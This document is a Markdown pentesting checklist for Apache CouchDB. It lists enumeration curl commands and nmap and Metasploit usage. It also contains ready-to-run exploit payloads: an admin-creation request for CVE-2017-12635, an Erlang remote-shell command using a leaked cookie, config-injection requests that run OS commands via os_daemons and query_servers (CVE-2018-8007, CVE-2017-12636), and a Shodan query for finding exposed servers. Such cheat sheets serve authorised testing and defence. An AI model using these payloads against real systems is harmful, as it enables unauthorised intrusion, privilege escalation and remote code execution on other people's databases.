# CouchDB Pentesting Checklist & Commands

## üéØ What am I realistically expecting to find here?

‚≠ê After enumerating CouchDB (ports 5984/6984), I realistically expect to find:

- [ ] Banner with CouchDB version
- [ ] Publicly accessible REST API endpoints
- [ ] List of all databases (`/_all_dbs`)
- [ ] Unprotected documents (including credentials)
- [ ] Potential admin misconfigurations or CVEs (e.g., CVE-2017-12635)
- [ ] Erlang cookie for cluster RCE pivot
- [ ] Possible local.ini manipulation for code execution

---

## ‚úÖ CouchDB Pentest Checklist

- [ ] **Banner Grabbing**
    - Quickly confirm CouchDB and version.
    ```
    curl http://<IP>:5984/
    ```
    - Expected responses:
        ```
        {"couchdb":"Welcome","version":"2.0.0",...}
        {"error":"unauthorized","reason":"Authentication required."}
        ```

---

- [ ] **Automatic Enumeration with Nmap**
    - Discover databases and stats (where possible).
    ```
    nmap -sV --script couchdb-databases,couchdb-stats -p 5984 <IP>
    ```
    - Metasploit scanner:
    ```
    msf> use auxiliary/scanner/couchdb/couchdb_enum
    ```

---

- [ ] **Manual Endpoint Enumeration**
    - Explore CouchDB REST API:
    ```
    curl http://<IP>:5984/_all_dbs
    curl http://<IP>:5984/_active_tasks
    curl http://<IP>:5984/_membership
    curl http://<IP>:5984/_up
    ```
    - For authenticated access (if needed):
    ```
    curl http://user:pass@<IP>:5984/_all_dbs
    ```

---

- [ ] **Enumerate Databases & Documents**
    - **List Databases**
    ```
    curl -X GET http://<IP>:5984/_all_dbs
    ```
    - **Database Info**
    ```
    curl -X GET http://<IP>:5984/<database>
    ```
    - **List Documents in DB**
    ```
    curl -X GET http://<IP>:5984/<database>/_all_docs
    ```
    - **Read Individual Document**
    ```
    curl -X GET http://<IP>:5984/<database>/<document_id>
    ```

---

- [ ] **Common Endpoints to Try**
    - Info & stats:
    ```
    /_active_tasks
    /_cluster_setup
    /_membership
    /_node/_local/_stats
    /_uuids
    /_up
    ```
    - Use GET with or without authentication:
    ```
    curl http://<IP>:5984/_up
    curl http://<IP>:5984/_uuids
    ```

---

## ‚úÖ Privilege Escalation CVEs

- [ ] **CVE-2017-12635**: Create admin user (abusing JSON parser quirk)
    ```
    curl -X PUT http://<IP>:5984/_users/org.couchdb.user:hacktricks \
    -H "Content-Type: application/json" \
    -d '{"type":"user","name":"hacktricks","roles":["_admin"],"roles":[],"password":"hacktricks"}'
    ```
    - ‚úÖ Result: New admin user `hacktricks:hacktricks`

---

## ‚úÖ Exploiting Erlang Cookie for RCE

‚≠ê If Erlang cookie is leaked (e.g. from CouchDB process list):

- [ ] **Use Erlang Shell for Remote Commands**
    ```bash
    erl -setcookie <COOKIE> -name attacker@<YourIP> -remsh couchdb@<TargetIP>
    ```
    - In Erlang prompt:
    ```erlang
    os:cmd("id").
    ```
- [ ] Related port: **4369** (EPMD)
    - See: [Pentesting Erlang Port Mapper Daemon (epmd)](4369-pentesting-erlang-port-mapper-daemon-epmd)

---

## ‚úÖ Config File Manipulation for RCE

- [ ] **Write to local.ini (requires write permissions)**
    - Add OS daemon to execute commands:
    ```bash
    curl -X PUT 'http://user:pass@localhost:5984/_node/_local/_config/cors/origins' \
    -d "payload\n\n[os_daemons]\ndaemon = /bin/bash -c 'touch /tmp/pwned'"
    ```
    - Killing CouchDB will auto-restart with new daemon.

---

- [ ] **CVE-2018-8007**
    - Abuse CORS origin injection to write new section to local.ini.
    - Exploit requires **write permissions** to local.ini.

---

- [ ] **CVE-2017-12636**
    - Abuse query_servers section to run OS commands.
    - Example (requires local.ini writable):
    ```bash
    curl -X PUT 'http://user:pass@localhost:5984/_node/_local/_config/query_servers/cmd' \
    -d '"/bin/bash -c whoami > /tmp/out"'
    ```

---

## ‚úÖ Shodan Search

- [ ] Discover exposed CouchDB instances.
    ```
    port:5984 couchdb
    ```

---

## ‚úÖ References & Further Reading

- [CouchDB API Documentation](https://docs.couchdb.org/en/latest/api/index.html)
- [Bitvijays Pentesting CouchDB](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html)
- [0xdf HTB Canape Walkthrough](https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution)
- [LZone CouchDB Cheat Sheet](https://lzone.de/cheat-sheet/CouchDB)

---

## ‚úÖ Notes & Tips

- CouchDB often exposes REST API on 5984 (HTTP) or 6984 (HTTPS)
- Default setup can allow anonymous reads of `_all_dbs`
- Auth can be bypassed if old CVEs are present
- Cluster setups can leak Erlang cookie (pivot to RCE)
- Always check CouchDB version for known vulnerabilities
